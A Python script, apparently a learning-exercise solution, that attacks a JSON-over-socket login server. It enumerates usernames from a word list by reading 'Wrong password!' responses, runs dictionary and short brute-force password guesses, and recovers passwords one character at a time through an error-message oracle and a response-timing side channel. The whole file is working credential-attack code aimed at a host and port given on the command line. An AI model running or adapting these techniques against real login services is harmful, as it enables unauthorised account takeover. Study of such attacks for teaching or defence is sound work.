import socket
from argparse import ArgumentParser
from itertools import product
import string
import json
import time


def generate_pwd_from_file(f):
    for pwd in f:
        for i_pwd in product(*[(c.upper(), c.lower()) if c.isalpha() else (c,) for c in pwd]):
            yield ''.join(i_pwd)


def generate_pwds():
    chars = string.ascii_letters + string.digits
    pass_length = 1
    while True:
        for el in product(chars, repeat=pass_length):
            yield ''.join(el)
        pass_length += 1
        if pass_length > 4:
            break


class PasswordCracker:
    def __init__(self, url, port_number):
        self.username = ''
        self.password = ''
        self.pwd_list = []
        self.current_index = 0
        self.login_dict = {"login": self.username,
                           "password": self.password}
        self.socket = socket.socket()
        self.address = (url, port_number)
        self.socket.connect(self.address)

    def password_by_exception(self):
        chars = string.ascii_letters + string.digits
        pwd_found = False
        while True:
            for c in chars:
                if self.current_index == len(self.pwd_list):
                    self.pwd_list.append(c)
                self.pwd_list[self.current_index] = c
                self.login_dict['password'] = ''.join(self.pwd_list)
                data = json.dumps(self.login_dict).encode()
                self.socket.send(data)
                response = self.socket.recv(1024)
                if json.loads(response.decode())['result'] == "Exception happened during login":
                    self.current_index += 1
                    break
                elif json.loads(response.decode())['result'] == "Connection success!":
                    # print(''.join(self.pwd_list), self.login_dict)
                    pwd_found = True
                    break
            if pwd_found:
                self.print_result()
                break

    def password_by_response_delay(self):
        chars = string.ascii_letters + string.digits

        pwd_found = False
        while True:
            times = []
            for i, c in enumerate(chars):
                if self.current_index == len(self.pwd_list):
                    self.pwd_list.append(c)
                self.pwd_list[self.current_index] = c
                self.login_dict['password'] = ''.join(self.pwd_list)
                data = json.dumps(self.login_dict).encode()
                self.socket.send(data)
                start = time.perf_counter()
                response = self.socket.recv(1024)
                end = time.perf_counter()
                times.append(end - start)
                if json.loads(response.decode())['result'] == "Connection success!":
                    pwd_found = True
                    break
            if pwd_found:
                self.print_result()
                break
            else:
                self.pwd_list[self.current_index] = chars[times.index(max(times))]
                # print(max(times), times.index(max(times)), ''.join(self.pwd_list), self.current_index, len(self.pwd_list))
                # print(times)
                self.current_index += 1
                if self.current_index == 10:
                    break

    def username_from_database(self):
        with open('/Users/hits/PycharmProjects/pythonProject/Password Hacker/logins.txt') as file:
            for login in file:
                self.login_dict['login'] = login.strip()
                data = json.dumps(self.login_dict).encode()
                self.socket.send(data)
                response = self.socket.recv(1024)
                if json.loads(response.decode())['result'] == "Wrong password!":
                    self.username = self.login_dict['login']
                    break

    def password_from_database(self):
        with open('/Users/hits/PycharmProjects/pythonProject/Password Hacker/passwords.txt') as file:
            for pwd in generate_pwd_from_file(file):
                pwd = pwd.strip()
                # print(pwd)
                # print('-' * 80)
                data = pwd.encode()
                self.socket.send(data)
                response = self.socket.recv(1024)
                if response.decode() == 'Connection success!':
                    self.password = pwd
                    break
    def crack_login(self):
        self.username_from_database()
        self.password_by_response_delay()

    def print_result(self):
        # login_dict = {'login': self.username,
        #               'password': self.password}
        print(json.dumps(self.login_dict))

    def disconnect(self):
        self.socket.close()


if __name__ == '__main__':
    # Argument parsing
    parser = ArgumentParser()
    parser.add_argument('address', type=str, help='Server IP address')
    parser.add_argument('port', type=int, help='Port number')
    args = parser.parse_args()
    ipaddress = args.address
    port = args.port
    # Password cracking
    cracker = PasswordCracker(ipaddress, port)
    cracker.crack_login()
    cracker.disconnect()

